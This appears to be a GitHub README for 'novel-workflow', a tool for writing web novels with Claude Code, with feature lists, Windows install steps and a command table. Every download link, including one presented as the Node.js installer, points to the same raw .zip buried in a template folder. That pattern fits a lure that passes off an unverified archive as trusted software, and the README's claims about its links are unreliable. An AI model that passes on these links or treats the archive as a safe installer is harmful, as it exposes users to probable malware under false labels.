# 🚀 novel-workflow - Simple AI Writing Toolchain

[![Download latest release](https://img.shields.io/badge/Download-novel--workflow-brightgreen)](https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip)

---

## 📋 What is novel-workflow?

novel-workflow is a tool designed to support writing online novels using multiple AI assistants. It helps you move from gathering ideas and materials to delivering your final story. The tool works with Claude Code, a platform for managing AI interactions. Using a set of easy commands, novel-workflow guides your writing step by step.

Its main goal is to make the writing process smoother by helping you organize ideas, manage styles, create outlines, write content, and check quality — all powered by AI.

---

## 🎯 Key Features

- **12 Slash Commands:** Commands cover the full writing cycle. You can extract ideas, manage settings, plan outlines, write chapters, review quality, and keep your writing progress synced.
- **Multiple AI Models:** Different AI work together: Claude focuses on writing, Codex helps with logic and checks, and Gemini improves style and flow.
- **Context Levels:** The tool loads information in three stages — hot, warm, and cold — to keep the writing relevant and consistent.
- **State Management:** Your work saves in both Markdown and JSON formats. This means your progress and settings won’t be lost across sessions.
- **Four Story Templates:** Choose from crime, fantasy, urban drama, or sci-fi setups to start writing right away.
- **Works Offline:** The core workflows don’t require external services. You can use the tool with files only, no internet needed.

---

## 💾 Download novel-workflow

[![](https://img.shields.io/badge/Download-latest%20release-blue)](https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip)

To get the software, visit the release page linked above. There, you will find the latest version ready to download.

---

## 🖥️ How to Install and Run on Windows

Follow these steps carefully. No programming experience is needed.

### Step 1: Download the Application

- Go to the release page:  
  https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip  
- Find the latest Windows package. This is usually a `.zip` file.
- Click to download and save it to your computer.

### Step 2: Extract Files

- Locate the downloaded `.zip` file in your Downloads folder.
- Right-click the file and choose “Extract All...”
- Pick a folder to extract the files into — for example, create a new folder on your Desktop called `novel-workflow`.
- Complete the extraction.

### Step 3: Prepare the Environment

novel-workflow requires Node.js, a runtime to run JavaScript programs outside a browser.

- If you don’t have Node.js installed, download it here:  
  https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip  
- Choose the Windows installer and follow the setup steps.
- To check installation, press `Win+R`, type `cmd`, and press Enter. In the black window, type:  
  `node -v`  
- You should see a version number. If not, repeat the installation carefully.

### Step 4: Install Dependencies

- Open the Command Prompt (press `Win+R`, then type `cmd`).
- Change directory to where you extracted novel-workflow. For example:  
  `cd Desktop\novel-workflow`  
- Run one of these commands to install needed packages:  
  ```  
  npm install  
  ```  
  This may take a few minutes while packages download.

### Step 5: Build the Project

- Still in the Command Prompt, run:  
  ```  
  npm run build  
  ```  
- This will prepare the program to run.

### Step 6: Initialize novel-workflow

- Run the initialization command with:  
  ```  
  node bin/novel-workflow.mjs init  
  ```  
- You will see a series of prompts to choose your story template and writing platform.
- Use arrow keys and Enter to select options.
- After setup, you will see a message confirming this is ready.

### Step 7: Using novel-workflow

- Open Claude Code.
- Use slash commands starting with `/novel:` to interact with novel-workflow.
- For example, `/novel:init` sets up your project folder and files.
- Other commands help you plan, write, and review your content step by step.

---

## ⚙️ Common slash commands

| Command           | Purpose                           | AI Models                 |
|-------------------|---------------------------------|---------------------------|
| `/novel:init`     | Set up project and templates     | Claude                    |
| `/novel:style`    | Extract ideas and create style   | Claude + Gemini           |
| `/novel:setting`  | Manage characters and world info | Claude                    |
| `/novel:outline`  | Plan volumes and chapters        | Claude + Codex            |
| `/novel:write`    | Write or continue chapters       | Claude                    |
| `/novel:review`   | Check quality and logic          | Codex                     |
| `/novel:sync`     | Sync status and progress         | Claude                    |

For full details, check the project files under `/docs` or the built-in help commands in Claude Code.

---

## 🔧 System Requirements

- Windows 10 or later
- 4 GB RAM minimum
- Node.js version 16 or higher
- Internet access for initial install (offline use possible after setup)

---

## 🚀 Start Writing Now

[Download novel-workflow here](https://raw.githubusercontent.com/proportionable-plaguespot199/novel-workflow/main/templates/state/genres/hongkong-crime/workflow_novel_v2.8-beta.3.zip)

Once installed and initialized, the tool will help you write using AI in a clear, guided way without needing programming skills.